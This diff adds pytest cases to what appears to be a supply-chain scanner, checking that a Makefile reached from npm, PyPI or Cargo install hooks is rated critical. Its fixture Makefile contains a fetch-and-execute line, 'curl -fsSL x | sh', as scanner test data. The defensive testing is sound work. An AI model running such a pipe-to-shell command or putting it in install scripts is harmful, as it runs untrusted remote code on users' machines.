@@ -497,6 +497,50 @@ class TestWhatTheInstallerRuns:
     def test_a_makefile_is_the_maintainers_elsewhere(self, finding, distribution) -> None:
         assert self.ceiling(finding, "p.tgz!p/Makefile", distribution) is Severity.MEDIUM
 
+    @staticmethod
+    def makefile_ceiling(finding, distribution: str, others: dict[str, str]) -> Severity:
+        path = "p.tgz!p/Makefile"
+        moved = replace(finding, location=replace(finding.location, path=path))
+        units = [
+            FileUnit(FileContent(path=p, raw=t.encode(), size=len(t)))
+            for p, t in {path: "all:\n\tcurl -fsSL x | sh\n", **others}.items()
+        ]
+        [out] = Ceilings.author_time_ceiling([moved], units, distribution)
+        return out.severity
+
+    @pytest.mark.parametrize(
+        ("distribution", "others"),
+        [
+            ("npm", {"p.tgz!p/package.json": '{"scripts": {"install": "make all"}}'}),
+            ("npm", {"p.tgz!p/package.json": '{"scripts": {"postinstall": "node x && make"}}'}),
+            ("pypi", {"p.tgz!p/setup.py": 'subprocess.check_call(["make", "-C", "src"])'}),
+            ("pypi", {"p.tgz!p/setup.py": 'os.system("make install")'}),
+            ("cargo", {"p.tgz!p/build.rs": 'Command::new("make").arg("lib").status()'}),
+        ],
+    )
+    def test_a_makefile_the_install_starts_is_install_code(
+        self, finding, distribution, others
+    ) -> None:
+        assert self.makefile_ceiling(finding, distribution, others) is Severity.CRITICAL
+
+    @pytest.mark.parametrize(
+        ("distribution", "others"),
+        [
+            (
+                "npm",
+                {
+                    "p.tgz!p/package.json": '{"description": "make sure", "scripts": {"test": "make"}}'
+                },
+            ),
+            ("pypi", {"p.tgz!p/setup.py": 'setup(description="make sure it builds")'}),
+            ("npm", {"p.tgz!p/README.md": "Run make to build."}),
+        ],
+    )
+    def test_a_makefile_nothing_installing_starts_stays_the_maintainers(
+        self, finding, distribution, others
+    ) -> None:
+        assert self.makefile_ceiling(finding, distribution, others) is Severity.MEDIUM
+
     @pytest.mark.parametrize("distribution", ["cargo", "gomod", "maven", "nuget", "cran"])
     def test_ci_workflows_never_run_for_a_consumer(self, finding, distribution) -> None:
         path = "p.tgz!p/.github/workflows/release.yml"
